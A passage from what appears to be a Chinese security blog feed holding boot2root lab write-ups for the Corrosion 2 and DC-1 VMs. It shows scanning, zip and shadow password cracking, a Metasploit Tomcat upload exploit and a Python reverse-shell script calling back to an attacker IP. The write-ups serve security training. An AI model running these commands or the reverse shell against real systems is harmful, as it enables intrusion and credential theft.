ADDRESS</span><br><span class="line">1   8.06 ms corrosion.lan (192.168.1.166)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.166/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/14 14:51:28 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/14 14:53:55 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.1.166:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Corrosion2&gt; gobuster dir -u http://192.168.1.166:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.166:8080/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php,zip</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/14 14:57:08 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/docs                 (Status: 302) [Size: 0] [--&gt; /docs/]</span><br><span class="line">/examples             (Status: 302) [Size: 0] [--&gt; /examples/]</span><br><span class="line">/backup.zip           (Status: 200) [Size: 33723]             </span><br><span class="line">/readme.txt           (Status: 200) [Size: 153]               </span><br><span class="line">/manager              (Status: 302) [Size: 0] [--&gt; /manager/] </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww     (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww.html (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww.txt (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww.php (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww.zip (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube.txt (Status: 400) [Size: 804]           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube.php (Status: 400) [Size: 804]           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube.zip (Status: 400) [Size: 804]           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube.html (Status: 400) [Size: 804]          </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs.zip (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs   (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs.html (Status: 400) [Size: 804]            </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs.txt (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs.php (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog    (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog.txt (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog.php (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog.zip (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog.html (Status: 400) [Size: 804]             </span></span><br><span class="line">/**http%3A%2F%2Fwww.php (Status: 400) [Size: 804]             </span><br><span class="line">/**http%3A%2F%2Fwww.zip (Status: 400) [Size: 804]             </span><br><span class="line">/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]               </span><br><span class="line">/**http%3A%2F%2Fwww.html (Status: 400) [Size: 804]            </span><br><span class="line">/**http%3A%2F%2Fwww.txt (Status: 400) [Size: 804]             </span><br><span class="line">/RELEASE-NOTES.txt    (Status: 200) [Size: 6898]              </span><br><span class="line"><span class="meta">/External%</span><span class="bash">5CX-News.txt (Status: 400) [Size: 795]              </span></span><br><span class="line"><span class="meta">/External%</span><span class="bash">5CX-News.php (Status: 400) [Size: 795]              </span></span><br><span class="line"><span class="meta">/External%</span><span class="bash">5CX-News.zip (Status: 400) [Size: 795]              </span></span><br><span class="line"><span class="meta">/External%</span><span class="bash">5CX-News    (Status: 400) [Size: 795]               </span></span><br><span class="line"><span class="meta">/External%</span><span class="bash">5CX-News.html (Status: 400) [Size: 795]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity.php (Status: 400) [Size: 804]         </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity.zip (Status: 400) [Size: 804]         </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity.html (Status: 400) [Size: 804]        </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity.txt (Status: 400) [Size: 804]         </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar.php (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar   (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar.zip (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar.html (Status: 400) [Size: 804]            </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar.txt (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]      </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman.zip (Status: 400) [Size: 804]  </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman.html (Status: 400) [Size: 804] </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman.txt (Status: 400) [Size: 804]  </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman.php (Status: 400) [Size: 804]  </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog.zip (Status: 400) [Size: 804]            </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog  (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog.html (Status: 400) [Size: 804]           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog.txt (Status: 400) [Size: 804]            </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog.php (Status: 400) [Size: 804]            </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik    (Status: 400) [Size: 804]               </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik.html (Status: 400) [Size: 804]             </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik.txt (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik.php (Status: 400) [Size: 804]              </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik.zip (Status: 400) [Size: 804]              </span></span><br><span class="line">                                                              </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/14 15:02:22 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Corrosion2/1.png" alt></p>
<ul>
<li><p>/backup.zip</p>
</li>
<li><p>破解压缩包密码如下</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\Corrosion2&gt; fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./backup.zip </span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == @administrator_hi5</span><br></pre></td></tr></table></figure>

<ul>
<li>解密，找到密码如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">&lt;user username&#x3D;&quot;manager&quot; password&#x3D;&quot;melehifokivai&quot; roles&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">&lt;user username&#x3D;&quot;admin&quot; password&#x3D;&quot;melehifokivai&quot; roles&#x3D;&quot;admin-gui, manager-gui&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion2/2.png" alt></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.1.166</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername admin</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword melehifokivai</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion2/3.png" alt></p>
<ul>
<li><p>发现<code>jaye / melehifokivai</code></p>
</li>
<li><p><code>look</code>文件</p>
</li>
</ul>
<p><img data-src="./Corrosion2/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// shadow</span><br><span class="line">root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::</span><br><span class="line">daemon:*:18858:0:99999:7:::</span><br><span class="line">bin:*:18858:0:99999:7:::</span><br><span class="line">sys:*:18858:0:99999:7:::</span><br><span class="line">sync:*:18858:0:99999:7:::</span><br><span class="line">games:*:18858:0:99999:7:::</span><br><span class="line">man:*:18858:0:99999:7:::</span><br><span class="line">lp:*:18858:0:99999:7:::</span><br><span class="line">mail:*:18858:0:99999:7:::</span><br><span class="line">news:*:18858:0:99999:7:::</span><br><span class="line">uucp:*:18858:0:99999:7:::</span><br><span class="line">proxy:*:18858:0:99999:7:::</span><br><span class="line">backup:*:18858:0:99999:7:::</span><br><span class="line">list:*:18858:0:99999:7:::</span><br><span class="line">irc:*:18858:0:99999:7:::</span><br><span class="line">gnats:*:18858:0:99999:7:::</span><br><span class="line">nobody:*:18858:0:99999:7:::</span><br><span class="line">systemd-network:*:18858:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18858:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18858:0:99999:7:::</span><br><span class="line">messagebus:*:18858:0:99999:7:::</span><br><span class="line">syslog:*:18858:0:99999:7:::</span><br><span class="line">_apt:*:18858:0:99999:7:::</span><br><span class="line">tss:*:18858:0:99999:7:::</span><br><span class="line">uuidd:*:18858:0:99999:7:::</span><br><span class="line">tcpdump:*:18858:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:18858:0:99999:7:::</span><br><span class="line">usbmux:*:18858:0:99999:7:::</span><br><span class="line">rtkit:*:18858:0:99999:7:::</span><br><span class="line">dnsmasq:*:18858:0:99999:7:::</span><br><span class="line">cups-pk-helper:*:18858:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:18858:0:99999:7:::</span><br><span class="line">avahi:*:18858:0:99999:7:::</span><br><span class="line">kernoops:*:18858:0:99999:7:::</span><br><span class="line">saned:*:18858:0:99999:7:::</span><br><span class="line">nm-openvpn:*:18858:0:99999:7:::</span><br><span class="line">hplip:*:18858:0:99999:7:::</span><br><span class="line">whoopsie:*:18858:0:99999:7:::</span><br><span class="line">colord:*:18858:0:99999:7:::</span><br><span class="line">geoclue:*:18858:0:99999:7:::</span><br><span class="line">pulse:*:18858:0:99999:7:::</span><br><span class="line">gnome-initial-setup:*:18858:0:99999:7:::</span><br><span class="line">gdm:*:18858:0:99999:7:::</span><br><span class="line">sssd:*:18858:0:99999:7:::</span><br><span class="line">randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18886::::::</span><br><span class="line">tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::</span><br><span class="line">sshd:*:18887:0:99999:7:::</span><br><span class="line">jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::</span><br><span class="line"></span><br><span class="line">// passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">whoopsie:x:120:125::/nonexistent:/bin/false</span><br><span class="line">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin</span><br><span class="line">randy:x:1000:1000:randy,,,:/home/randy:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">tomcat:x:1001:1001::/home/tomcat:/bin/sh</span><br><span class="line">sshd:x:127:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">jaye:x:1002:1002::/home/jaye:/bin/sh</span><br></pre></td></tr></table></figure>

<ul>
<li><code>john</code>破解</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unshadow .&#x2F;passwd .&#x2F;shadow &gt;pass.txt	</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst .&#x2F;pass.txt</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt .&#x2F;pass.txt</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">07051986randy    (randy)</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion2/5.png" alt></p>
<h3 id="获取其他用户-amp-amp-提权"><a href="#获取其他用户-amp-amp-提权" class="headerlink" title="获取其他用户&amp;&amp;提权"></a>获取其他用户&amp;&amp;提权</h3><p><img data-src="./Corrosion2/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("192.168.1.82",7776))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">import pty</span><br><span class="line"></span><br><span class="line">pty.spawn("sh")</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion2/7.png" alt></p>
<p><img data-src="./Corrosion2/8.png" alt></p>
<p><img data-src="./Corrosion2/9.png" alt></p>
<ul>
<li>其实通过look命令也可以盲猜文件名拿到flag</li>
</ul>
<p><img data-src="./Corrosion2/10.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Corrosion</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Corrosion</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1</title>
    <url>/2020/12/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-1/</url>
    <content><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h3><ul>
<li>kali2020 192.168.42.105</li>
<li>windows10</li>
<li>DC-1 192.168.43.154</li>
</ul>
<h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:02:ae, IPv4: 192.168.43.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 2)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 3)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 4)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 5)</span><br><span class="line">192.168.43.154  08:00:27:af:04:b8       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>nmap</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# nmap -sV -A 192.168.43.154</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-26 22:54 EST</span><br><span class="line">Nmap scan report for 192.168.43.154</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          39825/udp6  status</span><br><span class="line">|   100024  1          42902/tcp6  status</span><br><span class="line">|   100024  1          44255/udp   status</span><br><span class="line">|_  100024  1          56293/tcp   status</span><br><span class="line">MAC Address: 08:00:27:AF:04:B8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.45 ms 192.168.43.154</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.24 seconds</span><br></pre></td></tr></table></figure>

<h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p><img data-src="./DC-1/1.png" alt></p>
<p><img data-src="./DC-1/2.png" alt></p>
<p><img data-src="./DC-1/3.png" alt></p>
<h3 id="开源漏洞"><a href="#开源漏洞" class="headerlink" title="开源漏洞"></a>开源漏洞</h3><ul>
<li>CVE-2018-7600 RCE</li>
<li>CVE-2019-6339</li>
</ul>
<h4 id="MSF大法"><a href="#MSF大法" class="headerlink" title="MSF大法"></a>MSF大法</h4><p><img data-src="./DC-1/4.png" alt></p>
<ul>
<li>成功拿到shell</li>
</ul>
<p><img data-src="./DC-1/5.png" alt></p>
<ul>
<li>flag1，提醒我们去看配置文件</li>
</ul>
<p><img data-src="./DC-1/6.png" alt></p>
<ul>
<li>home目录下 看到了flag4</li>
</ul>
<p><img data-src="./DC-1/7.png" alt></p>
<h3 id="查找配置文件"><a href="#查找配置文件" class="headerlink" title="查找配置文件"></a>查找配置文件</h3><p><img data-src="./DC-1/8.png" alt></p>
<p>找到flag2 &amp;&amp; 数据库账号密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span 